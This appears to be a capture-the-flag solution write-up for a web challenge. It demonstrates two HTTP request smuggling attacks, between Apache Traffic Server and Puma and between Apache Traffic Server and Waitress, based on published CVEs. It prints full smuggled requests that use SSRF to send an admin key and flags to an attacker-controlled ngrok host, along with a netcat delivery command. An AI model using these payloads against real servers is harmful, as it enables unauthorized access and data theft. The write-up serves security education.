@@ -1,0 +1,185 @@
+<h1>Flag Portal - Solution</h1>
+
+<p><strong>Author</strong>: zeyu2001</p>
+
+<p><strong>Category</strong>: Web</p>
+
+<p>2 HTTP request smuggling vulns.</p>
+
+<h2>1) Between ATS and Puma</h2>
+
+<p>Conditions that make this possible:</p>
+
+<ul>
+<li>ATS interprets <code>"chunked"</code> as <code>chunked</code></li>
+<li>Puma ignores invalid / unsupported TE values</li>
+</ul>
+
+<p>First, we need to smuggle a request to <code>/admin</code> in <code>flagportal</code> to perform an SSRF.</p>
+
+<p>```http
+GET /home HTTP/1.1
+Host: example.com
+Transfer-Encoding: "chunked"</p>
+
+<p>DELETE /admin?backend=http://f754-42-60-216-15.ngrok.io HTTP/1.1
+Host: example.com
+Padding: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+0: x</p>
+
+<p>```</p>
+
+<p>Here's how this works.</p>
+
+<p>For ATS:</p>
+
+<ul>
+<li>ATS interprets <code>"chunked"</code> as <code>chunked</code>.</li>
+<li>It sees the first two characters of <code>DELETE</code>, and interprets <code>0xDE</code> as the chunk size.</li>
+<li>Using the padding header, we add enough bytes so that we have <code>0xDE</code> bytes when we reach <code>0: x</code>.</li>
+<li>The <code>0: x</code> line is parsed as the chunk terminator.</li>
+<li>ATS only sees one request, <code>GET /</code>.</li>
+</ul>
+
+<p>For Puma:</p>
+
+<ul>
+<li>Puma ignores the invalid <code>"chunked"</code> transfer encoding.</li>
+<li>The content length of the first request is then 0.</li>
+<li>Puma sees two requests, <code>GET /</code> and <code>DELETE /admin</code>.</li>
+</ul>
+
+<p>By hosting our own server, we can catch the request, including the <code>Admin-Key</code>.</p>
+
+<p>```http
+POST / HTTP/1.1
+Host: f754-42-60-216-15.ngrok.io
+User-Agent: Ruby
+Content-Length: 37
+Accept: <em>/</em>
+Accept-Encoding: gzip;q=1.0,deflate;q=0.6,identity;q=0.3
+Admin-Key: spendable-snoring-character-ditzy-sepia-lazily
+Content-Type: application/x-www-form-urlencoded
+First-Flag: SEE{n0w<em>g0</em>s0lv3<em>th3</em>n3xt<em>p4rt</em>bf38678e8a1749802b381aa0d36889e8}
+X-Forwarded-For: 42.60.216.15
+X-Forwarded-Proto: http</p>
+
+<p>target=https%3A%2F%2Fbit.ly%2F3jzERNa
+```</p>
+
+<p>This gives us the first flag, <code>SEE{n0w_g0_s0lv3_th3_n3xt_p4rt_bf38678e8a1749802b381aa0d36889e8}</code>.</p>
+
+<p>Note that with the above request smuggling method, we won't be able to get the second response from Puma, which is why there are two parts to this challenge. ATS will only show the first response even if we add more requests after the <code>DELETE</code> request above.</p>
+
+<h2>2) Between ATS and Waitress</h2>
+
+<p>Conditions that make this possible:</p>
+
+<ul>
+<li>ATS processes LF as line endings (instead of CRLF)</li>
+<li>Waitress allows LF in chunked extensions</li>
+</ul>
+
+<p>```http
+GET /api HTTP/1.1
+Host: backend
+Transfer-Encoding: chunked</p>
+
+<p>2;[\n]xx
+d9
+0</p>
+
+<p>POST /flag-plz HTTP/1.1
+Host: backend
+ADMIN-KEY: spendable-snoring-character-ditzy-sepia-lazily
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 40</p>
+
+<p>target=http://f754-42-60-216-15.ngrok.io</p>
+
+<p>0</p>
+
+<p>```</p>
+
+<p>Notice a <code>\n</code> is added to the chunk extension. Since ATS processes the LF as the end-of-line, it sees the following:</p>
+
+<p>```http
+GET /api HTTP/1.1
+Host: backend
+Transfer-Encoding: chunked</p>
+
+<p>2
+xx
+d9
+0</p>
+
+<p>POST /flag-plz HTTP/1.1
+Host: backend
+ADMIN-KEY: spendable-snoring-character-ditzy-sepia-lazily
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 40</p>
+
+<p>target=http://f754-42-60-216-15.ngrok.io</p>
+
+<p>0</p>
+
+<p>```</p>
+
+<p>The second request is encapsulated in the chunked content of the first request.</p>
+
+<p>Waitress, on the other hand, would see both requests:</p>
+
+<p>```http
+GET /api HTTP/1.1
+Host: backend
+Transfer-Encoding: chunked</p>
+
+<p>2
+d9
+0</p>
+
+<p>POST /flag-plz HTTP/1.1
+Host: backend
+ADMIN-KEY: spendable-snoring-character-ditzy-sepia-lazily
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 40</p>
+
+<p>target=http://f754-42-60-216-15.ngrok.io</p>
+
+<p>0</p>
+
+<p>```</p>
+
+<p><code>python3 payload.py | nc localhost 8000</code></p>
+
+<p>From our receiving server, we can see the flag: <code>SEE{y4y_r3qu3st_smuggl1ng_1s_fun_e28557a604fb011a89546a7fdb743fe9}</code></p>
+
+<p>```http
+POST / HTTP/1.1
+Host: f754-42-60-216-15.ngrok.io
+User-Agent: python-requests/2.27.1
+Content-Length: 106
+Accept: <em>/</em>
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+X-Forwarded-For: 42.60.216.15
+X-Forwarded-Proto: http</p>
+
+<p>flag=SEE%7By4y<em>r3qu3st</em>smuggl1ng<em>1s</em>fun_e28557a604fb011a89546a7fdb743fe9%7D&amp;congrats=Thanks+for+playing%21
+```</p>
+
+<h2>Credits</h2>
+
+<ul>
+<li>Thesis by Matthias Grenfeldt and Asta Olofsson where they investigated ATS in-depth. The vulnerabilities on the ATS-side of things in this challenge were discovered by them and detailed in this thesis.</li>
+</ul>
+
+<p><a href="http://kth.diva-portal.org/smash/get/diva2:1596031/FULLTEXT01.pdf">http://kth.diva-portal.org/smash/get/diva2:1596031/FULLTEXT01.pdf</a></p>
+
+<ul>
+<li>For Puma and Waitress, these were vulnerabilities I found when researching on web servers and request smuggling.
+<ul>
+<li>CVE-2022-24790: <a href="https://github.com/puma/puma/security/advisories/GHSA-h99w-9q5r-gjq9">https://github.com/puma/puma/security/advisories/GHSA-h99w-9q5r-gjq9</a></li>
+<li>CVE-2022-24761: <a href="https://github.com/Pylons/waitress/security/advisories/GHSA-4f7p-27jc-3c36">https://github.com/Pylons/waitress/security/advisories/GHSA-4f7p-27jc-3c36</a></li>
+</ul></li>
+</ul>
